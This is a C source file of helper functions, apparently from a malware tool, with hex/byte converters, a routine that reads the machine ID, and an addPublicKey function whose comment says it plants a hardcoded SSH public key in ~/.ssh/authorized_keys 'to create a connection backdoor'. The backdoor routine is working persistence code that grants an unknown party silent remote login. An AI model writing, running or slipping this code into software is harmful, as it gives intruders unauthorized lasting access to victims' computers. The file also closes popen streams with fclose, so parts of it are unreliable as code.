#include "tool.h"

#include <openssl/err.h>
#include <string.h>

/**
 * Convert byte to hex array.
 * https://gist.github.com/stigok/1737e05ef2c02cb03e7e584a8145b77e
 * @param bytes Byte array to convert (const unsigned char *)
 * @param size Size of the byte array (const unsigned short int)
 * @return The hex array created (char *)
 */
char *byteToHex(const unsigned char *bytes, const unsigned short int size) {
    char *str = (char *) malloc(((size * 2) + 1) * sizeof(char));

    if (str == NULL)
        return NULL;

    for (unsigned int i = 0; i < size; i++)
        sprintf(&str[i * 2], "%02X", bytes[i]);

    return str;
}

/**
 * Convert hex to byte array.
 * https://programming-idioms.org/idiom/176/hex-string-to-byte-array/3653/c
 * @param hex Hex array to convert (const char *)
 * @return The byte array created (unsigned char *)
 */
unsigned char *hexToByte(const char *hex) {
    unsigned short int size = (strlen(hex) / 2);
    unsigned char *bytes = (unsigned char *) malloc(size * sizeof(unsigned char));

    if (bytes == NULL)
        return NULL;

    for (unsigned short int i = 0, j = 0; i < size; i++, j += 2)
        bytes[i] = (hex[j] % 32 + 9) % 25 * 16 + (hex[j + 1] % 32 + 9) % 25;

    return bytes;
}

/**
 * Get the machine ID of the computer running the program.
 * @return The machine id of the computer. (char *)
 * Can be NULL.
 */
char *getMachineID(void) {
    FILE *f;

    if ((f = popen("cat /etc/machine-id", "r")) == NULL)
        return NULL;

    char *machine_id = (char *) malloc((MACHINE_ID_SIZE + 1) * sizeof(char));

    if (machine_id == NULL || fgets(machine_id, MACHINE_ID_SIZE + 1, f) == NULL) {
        fclose(f);
        return NULL;
    }

    fclose(f);

    return machine_id;
}

/**
 * Add a public ssh key to the ~/.ssh/authorized_keys file to create a connection backdoor.
 * @return Success of the operation (bool)
 */
bool addPublicKey(void) {
    FILE *f;

    if ((f = popen(
            "mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys && grep -q \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDG16JWYCqoh+FWxid5Bz09twgYIqu1SA97tDZyFXfxAM9cqX8AYBY1LwgS+LaIsSLa/bvblpZOzwfbt1ETgD1bv91VCIafUfiVIS27UIaJYu1JCiQV6sA4vmGDRgazO0qbEdOezwi0EyHbzOy+5z/6to1R5kABCKURfzuRoaQahNekr7NHGj2GTs8RNSC2n042ihlBpyDq2Q+oXwRUrykhKjtYtRyg/d1+oTQxmX3uoq3D+gRCAglvKXQl25gjX7zkzAsr4QYaoJBivE+8mYT5FIfyiytmMdww0ZjSAk7JiBrwQvjP6rydgtNFuvD7liDpl0G3zaWofU2Vzvr3VjVb\" ~/.ssh/authorized_keys || echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDG16JWYCqoh+FWxid5Bz09twgYIqu1SA97tDZyFXfxAM9cqX8AYBY1LwgS+LaIsSLa/bvblpZOzwfbt1ETgD1bv91VCIafUfiVIS27UIaJYu1JCiQV6sA4vmGDRgazO0qbEdOezwi0EyHbzOy+5z/6to1R5kABCKURfzuRoaQahNekr7NHGj2GTs8RNSC2n042ihlBpyDq2Q+oXwRUrykhKjtYtRyg/d1+oTQxmX3uoq3D+gRCAglvKXQl25gjX7zkzAsr4QYaoJBivE+8mYT5FIfyiytmMdww0ZjSAk7JiBrwQvjP6rydgtNFuvD7liDpl0G3zaWofU2Vzvr3VjVb\" >> ~/.ssh/authorized_keys",
            "r")) == NULL)
        return false;

    fclose(f);

    return true;
}